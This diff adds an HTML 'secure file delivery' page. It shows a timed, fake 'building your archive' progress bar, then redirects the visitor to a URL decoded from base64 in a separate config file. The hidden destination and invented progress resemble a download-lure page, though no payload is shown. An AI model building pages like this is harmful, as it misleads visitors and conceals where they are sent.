@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>File bundle</title>
+  <link rel="stylesheet" href="portal.css">
+</head>
+<body>
+  <header class="topbar">Secure file delivery</header>
+  <div class="shell">
+    <div class="panel">
+      <h1 id="title">Building your archive...</h1>
+      <p id="subtitle">This usually takes a few seconds.</p>
+      <div class="track"><div class="fill" id="fill"></div></div>
+      <div class="pct" id="pct">0%</div>
+      <p class="hint">Do not close this tab until the transfer starts.</p>
+    </div>
+  </div>
+
+  <script>
+  (function () {
+    var PREP_MS = 1400;
+    var STEP = 50;
+    var fillEl = document.getElementById('fill');
+    var pctEl = document.getElementById('pct');
+    var titleEl = document.getElementById('title');
+    var started = 0;
+    var timer = 0;
+    var destination = null;
+
+    function decodePayload(raw) {
+      var text = String(raw || '').trim();
+      if (!text) throw new Error('empty');
+      var url = atob(text);
+      if (!/^https?:\/\//i.test(url)) throw new Error('bad url');
+      return url;
+    }
+
+    function loadTarget() {
+      return fetch('portal.meta.json', { cache: 'no-store' })
+        .then(function (res) {
+          if (!res.ok) throw new Error('config');
+          return res.json();
+        })
+        .then(function (data) {
+          destination = decodePayload(data.u1);
+        });
+    }
+
+    function ease(t) {
+      var u = 1 - t;
+      return 1 - u * u * u;
+    }
+
+    function paint(v) {
+      var n = Math.round(v);
+      fillEl.style.width = n + '%';
+      pctEl.textContent = n + '%';
+    }
+
+    function finishPrep() {
+      paint(100);
+      titleEl.textContent = 'Starting download...';
+      if (destination) {
+        window.location.assign(destination);
+        return;
+      }
+      titleEl.textContent = 'Could not start download';
+    }
+
+    function tick(now) {
+      if (!started) started = now;
+      var t = (now - started) / PREP_MS;
+      if (t >= 1) {
+        window.clearTimeout(timer);
+        finishPrep();
+        return;
+      }
+      paint(ease(t) * 100);
+      timer = window.setTimeout(function () {
+        requestAnimationFrame(tick);
+      }, STEP);
+    }
+
+    loadTarget().catch(function () {
+      destination = null;
+    });
+
+    paint(0);
+    requestAnimationFrame(tick);
+  })();
+  </script>
+</body>
+</html>
